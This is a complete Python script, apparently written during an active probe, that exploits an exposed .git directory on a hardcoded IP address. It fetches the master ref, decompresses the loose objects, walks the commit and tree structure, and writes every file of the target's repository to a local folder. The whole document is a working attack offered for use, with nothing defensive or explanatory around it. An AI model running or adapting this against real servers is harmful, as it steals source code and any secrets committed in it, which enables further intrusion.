"""Minimal .git dumper: walk commit -> tree -> blobs via exposed loose objects
(no packs present on this target, confirmed via .git/objects/info/packs 404).
"""
import os
import sys
import urllib.request
import zlib

BASE = "http://34.21.204.204/.git/"
OUT = os.path.join(os.path.dirname(__file__), "dumped_repo")


def fetch(path: str) -> bytes:
    with urllib.request.urlopen(BASE + path, timeout=10) as r:
        return r.read()


def get_object(sha1: str) -> tuple[str, bytes]:
    raw = fetch(f"objects/{sha1[:2]}/{sha1[2:]}")
    data = zlib.decompress(raw)
    header, _, body = data.partition(b"\x00")
    kind, _, _size = header.partition(b" ")
    return kind.decode(), body


def parse_tree(body: bytes):
    entries = []
    i = 0
    while i < len(body):
        sp = body.index(b" ", i)
        mode = body[i:sp].decode()
        nul = body.index(b"\x00", sp)
        name = body[sp + 1 : nul].decode()
        sha1 = body[nul + 1 : nul + 21].hex()
        entries.append((mode, name, sha1))
        i = nul + 21
    return entries


def walk(sha1: str, prefix: str, seen: set):
    if sha1 in seen:
        return
    seen.add(sha1)
    kind, body = get_object(sha1)
    if kind != "tree":
        return
    for mode, name, child_sha1 in parse_tree(body):
        path = f"{prefix}{name}"
        if mode.startswith("4"):  # directory
            walk(child_sha1, path + "/", seen)
        else:
            kind2, blob = get_object(child_sha1)
            if kind2 != "blob":
                continue
            full = os.path.join(OUT, path)
            os.makedirs(os.path.dirname(full), exist_ok=True)
            with open(full, "wb") as f:
                f.write(blob)
            print("dumped:", path, len(blob), "bytes")


def main():
    head_ref = fetch("refs/heads/master").decode().strip()
    print("master commit:", head_ref)
    kind, body = get_object(head_ref)
    assert kind == "commit"
    print(body.decode(errors="replace"))
    tree_line = [l for l in body.split(b"\n") if l.startswith(b"tree ")][0]
    tree_sha1 = tree_line.split(b" ")[1].decode()
    print("root tree:", tree_sha1)
    os.makedirs(OUT, exist_ok=True)
    walk(tree_sha1, "", set())


if __name__ == "__main__":
    main()
